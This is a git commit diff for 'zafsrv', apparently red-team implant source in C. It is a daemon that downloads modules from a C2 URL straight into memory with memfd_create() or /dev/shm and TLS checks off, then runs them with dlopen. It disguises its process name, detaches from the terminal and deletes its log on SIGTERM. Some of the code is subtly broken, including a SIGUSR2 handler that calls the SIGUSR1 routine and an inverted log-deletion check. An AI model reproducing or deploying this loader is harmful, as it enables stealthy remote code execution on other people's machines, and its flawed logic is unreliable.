098734c31bfbd2c5c5988b0ae60ac547e6207876
D.Snezhkov <dsnezhkov@gmail.com>
2019-02-12 14:18:15 -0600

    Cleanup routines, memfd_create() checks

--- src/zafsrv/include/zaf.h
+++ src/zafsrv/include/zaf.h
@@ -1,15 +1,20 @@
+// loggging 
 #include "log.h"
+//
+// ps renaming
 #include "spt_status.h"
-
 
 #ifndef _HAVE_ZAF_H
 #define _HAVE_ZAF_H
 
 
-#define MAX_BUF 1024  //command buffer
-#define SLEEP_TIMER 5 //seconds
+#define MAX_BUF 1024                       // command buffer
+//#define SLEEP_TIMER 5                      // seconds to sleep
+#define DAEMON_CHDIR "/tmp"                // daemon directory to operate from 
+#define ZCURL_AGENT "libcurl-agent/1.0"    // UA-Agent
 
-
+#define SHM_NAME " "                       // memfd:<...>
+#define __NR_memfd_create 319              // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
 
 // ShMemTbl List
 typedef struct node {
@@ -24,6 +29,14 @@ typedef struct modtbl {
 node_t * head = NULL;
 
 
+// Kernel Verison: memfd_create support
+typedef struct {
+    int major;
+    int minor;
+    int memfd_supp;
+} memfd_kv;
+memfd_kv memfd_kv_s = {0,0,0};
+
 // Curl Shared Memory write callback
 typedef struct {
  int shm_fd;
@@ -36,10 +49,14 @@ typedef struct {
  * 3 - ...
  */
 volatile sig_atomic_t sigflag  = 0; 
-void setSignalHandlers();
+void setSignalHandlers(void);
 void handleSig(int signo);
 void doSigHup(void);
 void doSigUsr1(void);
+void doSigUsr2(void);
+void doSigInt(void);
+void doSigTerm(void);
+void cleanup(int);
 
 // Functions
 int  push(node_t * head, char* path, char * mname);
@@ -48,8 +65,13 @@ int  check_empty(node_t * head);
 int  list_sz(node_t * head);
 void write_modlist(node_t * head, int sock);
 int  processCommandReq (int sock, node_t * head);
-int  backgroundDaemonLeader();
-int  setupCmdP();
+int  backgroundDaemonLeader(void);
+int  setupCmdP(void);
+
+// global daemon log
+FILE *fp;
+char *logFile="/tmp/_mf.log";
+int logquiet = 1; // 1 - no stderr, 0 - stderr 
 
 #endif //_HAVE_ZAF_H
 
--- src/zafsrv/zaf.c
+++ src/zafsrv/zaf.c
@@ -34,12 +34,7 @@
 #include <unistd.h>
 #include <errno.h>
 
-
 #include "zaf.h"
-
-
-#define SHM_NAME " "
-#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
 
 
 // Wrapper to call memfd_create syscall
@@ -49,27 +44,63 @@ inline int memfd_create(const char *name, unsigned int flags) {
 
 // Detect if kernel is < or => than 3.17
 // Ugly as hell, probably I was drunk when I coded it
-int kernel_version() {
+// : Op_nomad: modded fallback, syscall checks
+int checKernel() {
+
 	struct utsname buffer;
-	uname(&buffer);
-	
 	char *token;
 	char *separator = ".";
+    int memfdcheck;
 	
+
+    if (uname(&buffer) != 0) {
+      log_error("KVersion: Unable to use utsname. Assume fallback");
+      return 0;
+    }
+
+    log_info("\tsystem name = %s", buffer.sysname);
+    log_info("\tnode name   = %s", buffer.nodename);
+    log_info("\trelease     = %s", buffer.release);
+    log_info("\tversion     = %s", buffer.version);
+    log_info("\tmachine     = %s", buffer.machine);
+
+    memfdcheck = syscall(SYS_memfd_create, SHM_NAME, 1);
+    if (memfdcheck != -1 ){
+        close(memfdcheck);
+        memfdcheck = 1; // memfd_create syscall available
+    }
+
 	token = strtok(buffer.release, separator);
-	if (atoi(token) < 3) {
-		return 0;
-	}
-	else if (atoi(token) > 3){
-		return 1;
-	}
+    memfd_kv_s.major = atoi(token);
+    log_debug("KVersion: release major: %d", memfd_kv_s.major);
 
 	token = strtok(NULL, separator);
-	if (atoi(token) < 17) {
-		return 0;
+    memfd_kv_s.minor = atoi(token);
+    log_debug("KVersion: release minor: %d", memfd_kv_s.minor);
+
+	if (memfd_kv_s.major < 3) {
+        memfd_kv_s.memfd_supp = 0; // shm only
+        return 0;
+	}
+	else if ( memfd_kv_s.major > 3){
+        if (memfdcheck == 1) {
+            memfd_kv_s.memfd_supp = 1;
+            return 1;
+        }
+        memfd_kv_s.memfd_supp = 0;
+	}
+
+	if ( memfd_kv_s.minor < 17) {
+        memfd_kv_s.memfd_supp = 0;
+        return 0;
 	}
 	else {
-		return 1;
+        if (memfdcheck == 1) {
+            memfd_kv_s.memfd_supp = 1;
+            return 1; 
+        }
+        memfd_kv_s.memfd_supp = 0;
+        return 0;
 	}
 }
 
@@ -80,10 +111,10 @@ int open_ramfs(void) {
 
 	//If we have a kernel < 3.17
 	// We need to use the less fancy way
-	if (kernel_version() == 0) {
+	if (memfd_kv_s.memfd_supp == 0) {
 		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
 		if (shm_fd < 0) { //Something went wrong :(
-			log_fatal("shm_fd: Could not open file descriptor");
+			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
 			return 1;
 		}
 	}
@@ -92,7 +123,7 @@ int open_ramfs(void) {
 	else {
 		shm_fd = memfd_create(SHM_NAME, 1);
 		if (shm_fd < 0) { //Something went wrong :(
-			log_fatal("memfd_create: Could not open file descriptor\n");
+			log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
 			return -1;
 		}
 	}
@@ -105,11 +136,11 @@ static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
 
     Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
 	if (write(shm_fd_s->shm_fd, ptr, nmemb) < 0) {
-		log_fatal("Could not write shm file.");
+		log_fatal("cURL Writer: Could not write shm file.");
 		close(shm_fd_s->shm_fd);
 		return 1;
 	}
-	log_debug("SHM file written");
+	log_debug("cURL Writer: SHM file written");
 
     return CURLE_OK;
 }
@@ -121,12 +152,12 @@ int download_to_RAM(char *download) {
 	int shm_fd;
 
 	shm_fd = open_ramfs(); // Give me a file descriptor to memory
-	log_info("File Descriptor %d Shared Memory created!", shm_fd);
+	log_info("RamWorker: File Descriptor %d Shared Memory created!", shm_fd);
 
     Shared_Mem_Fd shm_fd_s = {0};
     shm_fd_s.shm_fd=shm_fd;
 
-	log_debug("Passing URL to cURL: %s", download);
+	log_debug("RamWorker: Passing URL to cURL: %s", download);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);    
 	// We use cURL to download the file
@@ -136,7 +167,7 @@ int download_to_RAM(char *download) {
 		curl_easy_setopt(curl, CURLOPT_URL, download);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-		curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
+		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
         // Op_Nomad: Modded to avoid gcc warning 
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*) &shm_fd_s); //Args for our callback
@@ -144,7 +175,7 @@ int download_to_RAM(char *download) {
 		// Do the HTTPs request!
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
-			log_error("cURL failed: %s", curl_easy_strerror(res));
+			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
 			close(shm_fd);
             shm_fd=0;
 		}
@@ -159,19 +190,19 @@ void load_so(int shm_fd) {
 	char path[1024];
 	void *handle;
 
-	log_debug("Trying to load Shared Object");
-	if (kernel_version() == 1) { //Funky way
-	    log_debug("memfd_create() is supported.");
+	log_debug("LoadSo: Trying to load Shared Object");
+	if (memfd_kv_s.memfd_supp == 1) { //Funky way
+	    log_debug("LoadSo: memfd_create() is supported.");
 		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
 	} else { // Not funky way :(
 		close(shm_fd);
 		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
-	    log_debug("only /dev/shm supported.");
+	    log_debug("LoadSo: only /dev/shm supported.");
 	}
-    log_debug("Path to fd: %s", path);
+    log_debug("LoadSo: Path to fd: %s", path);
 	handle = dlopen(path, RTLD_LAZY);
 	if (!handle) {
-		log_error("Dlopen failed with error: %s", dlerror());
+		log_error("LoadSo: Dlopen failed with error: %s", dlerror());
 	}
 }
 
@@ -180,20 +211,20 @@ int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
     
 
-    log_debug("Populating Index Table");
-    if (kernel_version() == 1) { //Funky way
-	    log_debug("memfd_create() is supported.");
+    log_debug("MemTbl: Populating Index Table");
+    if (memfd_kv_s.memfd_supp == 1) { //Funky way
+	    log_debug("MemTbl: memfd_create() is supported.");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
     } else { // Not funky way :(
         close(shm_fd);
         snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
-	    log_debug("only /dev/shm supported.");
+	    log_debug("MemTbl: only /dev/shm supported.");
     }
     if (check_empty(head) == 0) {
-        log_debug("Head of list empty");
+        log_debug("Memtbl: Head of list empty");
         head = calloc(1,sizeof(node_t));
         if (head == NULL) {
-		    log_fatal("calloc() failed");
+		    log_fatal("MemTble: calloc() failed");
             return 1;
         }
         push_first(head, path, mname);
@@ -206,19 +237,17 @@ int setMemfdTbl(int shm_fd, char* mname) {
 
 
 int main (int argc, char **argv) {
-    FILE *fp;
-    char *logFile="/tmp/_mf.log";
-
 
     argv = save_ps_display_args(argc, argv);
     init_ps_display("zaf");
 
-    log_info("Opening log file: %s", logFile);
+    log_debug("Main: Opening log file: %s", logFile);
     fp = fopen (logFile,"w");
     if (fp == NULL) {
-        log_error("File not created okay, errno = %d", errno);
+        log_error("Main: File not created okay, errno = %d", errno);
     }else{
-        log_set_fp(fp);
+        log_set_fp(fp); 
+        log_set_quiet(logquiet);
     }
 
     backgroundDaemonLeader();
@@ -239,12 +268,19 @@ void doWork(){
 	int fd, i;
 
 	log_debug("\n\n=== ZAF ===\n");
-	log_debug("Trying for C2 download...");
+
+    if (checKernel() == 1){
+	    log_info("Worker: memfd_create() support seems to be available.");
+    }else{
+	    log_info("Worker: /dev/shm fallback. memfd_create() support is not available.");
+    }
+
+	log_debug("Worker: Trying for C2 download...");
 
     for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
     {
         snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
-        log_debug("Module URL = %s", urlbuf);
+        log_debug("Worker: Module URL = %s", urlbuf);
         fd = download_to_RAM(urlbuf);
         if (fd != 0){
             setMemfdTbl(fd, modules[i]);
@@ -258,66 +294,70 @@ int backgroundDaemonLeader(){
 
 
     // Fork, allowing the parent process to terminate.
-    log_debug("before first fork()");
+    log_debug("Daemon: before first fork()");
     pid_t pid = fork();
-    log_debug("after first fork()");
+    log_debug("Daemon: after first fork()");
     if (pid == -1) {
-        log_error("failed to fork while daemonising (errno=%d)",errno);
+        log_error("Daemon: failed to fork while daemonising (errno=%d)",errno);
     } else if (pid != 0) {
-        log_debug("after first fork(0 in parent. exiting.");
+        log_debug("Daemon: after first fork(0 in parent. exiting.");
         _exit(0);
     }
 
     // Start a new session for the daemon.
-    log_debug("before setsid()");
+    log_debug("Daemon: before setsid()");
     if (setsid()==-1) {
-        log_error("failed to become a session leader while daemonising(errno=%d)",errno);
+        log_error("Daemon: failed to become a session leader while daemonising(errno=%d)",errno);
     }
 
     // Fork again, allowing the parent process to terminate.
     //signal(SIGHUP,SIG_IGN);
-    log_debug("before signal SIGCHLD");
+    log_debug("Daemon: before signal SIGCHLD");
     signal(SIGCHLD, SIG_IGN); // avoid defunct processes. 
-    log_debug("before second fork()");
+    log_debug("Daemon: before second fork()");
     pid=fork();
-    log_debug("after second fork()");
+    log_debug("Daemon: after second fork()");
     if (pid == -1) {
-        log_error("failed to fork while daemonising (errno=%d)",errno);
+        log_error("Daemon: failed to fork while daemonising (errno=%d)",errno);
     } else if (pid != 0) {
-        log_debug("after first fork(0 in parent. exiting.");
+        log_debug("Daemon: after first fork() in parent. exiting.");
         _exit(0);
     }
 
     // Set the current working directory to the root directory.
-    log_debug("before chdir()");
-    if (chdir("/tmp") == -1) {
-        log_error("failed to change working directory while daemonising (errno=%d)",errno);
+    log_debug("Daemon: before chdir()");
+    if (chdir(DAEMON_CHDIR) == -1) {
+        log_error("Daemon: failed to change working directory while daemonising (errno=%d)",errno);
     }
 
     // Set the user file creation mask to zero.
-    log_debug("before umask()");
+    log_debug("Daemon: before umask()");
     umask(0);
 
-    log_debug("before close FD 0,1,2");
+    log_debug("Daemon: before close() FD 0,1,2");
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
+
+    // Reopen STDIN/OUT/ERR to Null
     if (open("/dev/null",O_RDONLY) == -1) {
-      printf("failed to reopen stdin while daemonising (errno=%d)",errno);
+      log_error("Daemon: failed to reopen stdin while daemonising (errno=%d)",errno);
     }
     if (open("/dev/null",O_WRONLY) == -1) {
-      printf("failed to reopen stdout while daemonising (errno=%d)",errno);
+      log_error("Daemon: failed to reopen stdout while daemonising (errno=%d)",errno);
     }
     if (open("/dev/null",O_RDWR) == -1) {
-	  printf("failed to reopen stderr while daemonising (errno=%d)",errno);
+	  log_error("Daemon: failed to reopen stderr while daemonising (errno=%d)",errno);
     }
-    log_debug("after reopen FD 0,1,2 ro /dev/null");
+    log_debug("Daemon: after reopen FD 0,1,2 ro /dev/null");
 
-    log_debug("before signal handlers");
-    setSignalHandlers(500000);
-    log_debug("after signal handlers");
-    log_debug("before doWork");
+    log_debug("Daemon: before signal handlers");
+    setSignalHandlers();
+    log_debug("Daemon: after signal handlers");
+
+    log_debug("Dameon: before doWork()");
     doWork();
+
     return 0;
 }
 
@@ -531,8 +571,11 @@ int push(node_t * head, char* path, char* mname) {
 /* -------------- SIG Handlers ------------------- */
 
 void setSignalHandlers(){
-    signal(SIGHUP, handleSig);
+    signal(SIGHUP,  handleSig);
     signal(SIGUSR1, handleSig);
+    signal(SIGUSR2, handleSig);
+    signal(SIGINT,  handleSig);
+    signal(SIGTERM, handleSig);
 }
 
 void handleSig(int signo) {
@@ -543,21 +586,70 @@ void handleSig(int signo) {
     switch(signo){
         case SIGHUP:
             log_warn("Signal handler got SIGHUP signal ... ");
-            sigflag = 0; // reset
+            sigflag = 1;
             doSigHup();
             break;
         case SIGUSR1:
             log_warn("Signal handler got SIGUSR1 signal ... ");
-            sigflag = 0; // reset
+            sigflag = 2;
             doSigUsr1();
+            break;
+        case SIGUSR2:
+            log_warn("Signal handler got SIGUSR1 signal ... ");
+            sigflag = 3;
+            doSigUsr1();
+            break;
+        case SIGINT:
+            log_warn("Signal handler got SIGINT signal ... ");
+            sigflag = 4;
+            doSigInt();
+            break;
+        case SIGTERM:
+            log_warn("Signal handler got SIGTERM signal ... ");
+            sigflag = 5;
+            doSigTerm();
             break;
     }
 }
 
 void doSigHup(void){
+    sigflag = 0; // check or reset
     log_debug("Executing SIGHUP code here ...");
 }
+
 void doSigUsr1(void){
+    sigflag = 0; // check or reset
     log_debug("Executing SIGUSR1 code here ...");
+}
+void doSigUsr2(void){
+    sigflag = 0; // check or reset
+    log_debug("Executing SIGUSR2 code here ...");
+}
+void doSigInt(void){
+    sigflag = 0; // check or reset
+    log_debug("Executing SIGINT code here ...");
+    log_debug("=== ZAF down ===");
+    cleanup(1); // leave log intact
+    exit(0);
+}
+void doSigTerm(void){
+    sigflag = 0; // check or reset
+    log_debug("Executing SIGTERM code here ...");
+    log_debug("=== ZAF down ===");
+    // - logrotate log
+    // - Send log offsite
+    cleanup(0); // remove log
+    exit(0);
+}
+
+void cleanup(int leaveLog){
+    struct stat sb;
+
+    fclose(fp);
+
+    if (! leaveLog) {
+        if (lstat(logFile, &sb))
+            unlink(logFile);
+    }
 }
 
